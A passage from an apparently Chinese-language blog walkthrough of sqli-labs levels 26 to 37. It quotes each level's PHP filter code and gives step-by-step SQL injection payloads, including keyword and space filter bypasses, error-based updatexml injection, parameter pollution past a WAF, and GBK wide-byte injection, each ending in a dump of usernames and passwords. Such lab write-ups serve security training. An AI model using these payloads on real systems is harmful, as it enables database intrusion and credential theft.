class="line">?id=&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=&#x27;security&#x27;%0baandnd%0btable_name=&#x27;users&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li></ol><ul><li>第26a关<br>与26关相比，只是闭合方式变更为’)</li></ul><h2 id="27-27a-大小写绕过或双写绕过的报错注入"><a href="#27-27a-大小写绕过或双写绕过的报错注入" class="headerlink" title="27-27a(大小写绕过或双写绕过的报错注入)"></a>27-27a(大小写绕过或双写绕过的报错注入)</h2><ol><li><p>测试并判断注入类型<br>本关通过查看源码可知，select和union被过滤了，但and和or这次没被过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题不大，可以通过大小写或重写绕过</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(concat(username,&#x27;:&#x27;,password))from(users)limit%0b0,1)),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li></ol><ul><li>第27a关<br>与27关相比，只是闭合方式变更为”</li></ul><h2 id="28-28a-双写或加字符绕过的联合注入"><a href="#28-28a-双写或加字符绕过的联合注入" class="headerlink" title="28-28a(双写或加字符绕过的联合注入)"></a>28-28a(双写或加字符绕过的联合注入)</h2><ol><li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>绕过union和select，选择重写或加字符绕过<br>末尾选择字符串截断%00<br>或<code>%0aand(&#39;1</code></li></ol><h1 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h1><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)%0Aorder%0Aby%0A4%0Aand(&#x27;1</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,3%0aand(&#x27;1</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,database(),3%0aand(&#x27;1</span><br><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,version(),3%0aand(&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&#x27;users&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(username,0x7e,password)),3%0bfrom%0busers%0bwhere%0b(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure></li></ol><ul><li>第28a关<br>与28关相比，只是过滤条件少了几个</li></ul><h2 id="29-31-绕过WAF的联合注入"><a href="#29-31-绕过WAF的联合注入" class="headerlink" title="29-31(绕过WAF的联合注入)"></a>29-31(绕过WAF的联合注入)</h2><ol><li><p>测试并判断注入类型<br>先进行常规操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+  出现报错</span><br><span class="line">?id=-1&#x27;union select 1,2,3 --+  爆出显示位</span><br></pre></td></tr></table></figure><p>但当我们进入login.php页面，再继续注入时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?id=1&#x27; --+</span><br></pre></td></tr></table></figure><p>页面跳转<br><img src="/simg/sqli-labs_29.png" alt="显示"><br>这里是部署了WAF<br>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。<br>详细解释：<a href="https://baike.baidu.com/item/WAF/3239498">WAF</a><br>第一个参数被WAF所检查，但第二个参数不会，因此我们可以加入第二个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2</span><br></pre></td></tr></table></figure></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2&#x27; order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第30关<br>与第29关差不多，只是闭合方式从’变更为”</p></li><li><p>第31关<br>与第29关差不多，只是闭合方式从”变更为”)</p></li></ul><h2 id="32-33-GET方式的宽字节注入"><a href="#32-33-GET方式的宽字节注入" class="headerlink" title="32-33(GET方式的宽字节注入)"></a>32-33(GET方式的宽字节注入)</h2><ol><li>测试并判断注入类型<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  发现被转义为了 1\&#x27;</span><br></pre></td></tr></table></figure>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>复习一下，<br>preg_replace()函数执行一个正则表达式的搜索和替换。详细：<a href="https://www.runoob.com/php/php-preg_replace.html">PHP preg_replace() 函数</a><br>preg_quote()函数用于转义正则表达式字符。详细：<a href="https://www.runoob.com/php/php-preg_quote.html">PHP preg_quote() 函数</a><br>因此，我们无法用单引号双引号闭合注入<br>但源码中还有一句引起了注意：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br></pre></td></tr></table></figure>这里表明是使用gbk编码，那么我们可以尝试使用宽字节注入。</li></ol><ul><li>当某字符的大小为一个字节时，称其字符为窄字节.</li><li>当某字符的大小为两个字节时，称其字符为宽字节.</li><li>所有英文默认占一个字节，汉字占两个字节</li><li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等<br>宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸。<br>宽字节注入情况：</li><li>客户端、连接层、结果集 都是GBK编码</li><li>使用iconv进行字符集转换，将UTF-8转为GBK，同时，set names字符集为GBK。提交%e9%8c%a6即可。</li><li>使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数（或者mb_convert_encoding）先转为UTF-8，然后再拼接入SQL语句。</li></ul><p>注意：<br>页面默认是utf-8，如果想看显示效果需要更改页面编码，我这里是用到了chrome的扩展商店的插件，具体可看下面这篇文章<br><a href="https://www.munue.com/172.html#:~:text=%E5%8F%B3%E9%94%AE%E7%82%B9%E5%87%BB%E5%9B%BE%E6%A0%87%EF%BC%8C%E6%89%93%E5%BC%80%E9%80%89%E9%A1%B9,%E8%BF%9B%E8%A1%8C%E9%80%89%E6%8B%A9%E5%92%8C%E8%AE%BE%E7%BD%AE%E7%BC%96%E7%A0%81%E3%80%82">Google Chrome 浏览器如何设置网页编码</a></p><p>最终，我们构造该语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>页面显示效果如下<br><img src="/simg/sqli-labs_32.png" alt="显示效果"></p><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27;order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(0x7e,id,0x7e,username,0x7e,password) from users) --+</span><br></pre></td></tr></table></figure></li></ol><ul><li>第33关<br>和第32关本质是一样的，只是源码用了addslashes()函数<br>addslashes()函数：addslashes() 函数返回在预定义的字符前添加反斜杠的字符串<br>预定义字符是：</li><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL<br>注入方式相同，这里不再重复</li></ul><h2 id="34-POST方式的宽字节注入"><a href="#34-POST方式的宽字节注入" class="headerlink" title="34(POST方式的宽字节注入)"></a>34(POST方式的宽字节注入)</h2><p>有两种方案：</p><ul><li>第1种</li></ul><ol><li><p>测试并判断注入类型<br>和之前的32，33关差别不大，但是这回是POST提交方式<br>因为在url栏中输入 %df 主要是以 16进制形式输入，而在输入框输入 %df 则是以普通字符串输入的。<br>所以我们需要略作改变<br>绕过方法：有些汉字的编码为三个字节的编码，我们将三个字节拆开来看，前两个为一组，后面的那个和 \ 相编码为两字节绕过，从而使得单引号逃逸</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; order by 3 #</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li></ol><ul><li>第2种</li></ul><ol><li><p>测试并判断注入类型<br>既然在输入栏不能直接输入，我们可以通过burp抓包来注入。</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; order by 3 #</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li></ol><ul><li>burp注入的另一种方案，在Hex栏修改16进制注入为df。<br>可参见：<a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br>虽然不算很实用的方法，但也不失为一种有趣的思路。</li></ul><h2 id="35-数字型的联合注入"><a href="#35-数字型的联合注入" class="headerlink" title="35(数字型的联合注入)"></a>35(数字型的联合注入)</h2><ol><li><p>测试并判断注入类型<br>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>通过这段源码，我们可以知道，id没有被单引号括起来所以addslashes起不到作用<br>直接payload即可</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li></ol><h2 id="36-37-宽字节注入"><a href="#36-37-宽字节注入" class="headerlink" title="36-37(宽字节注入)"></a>36-37(宽字节注入)</h2><ol><li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>我们可以注意到这里有个mysql_real_escape_string()函数<br>下列字符受影响：</li></ol><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>’</li><li>“</li><li>\x1a<br>那么直接用%df绕过</li></ul><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27; order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight 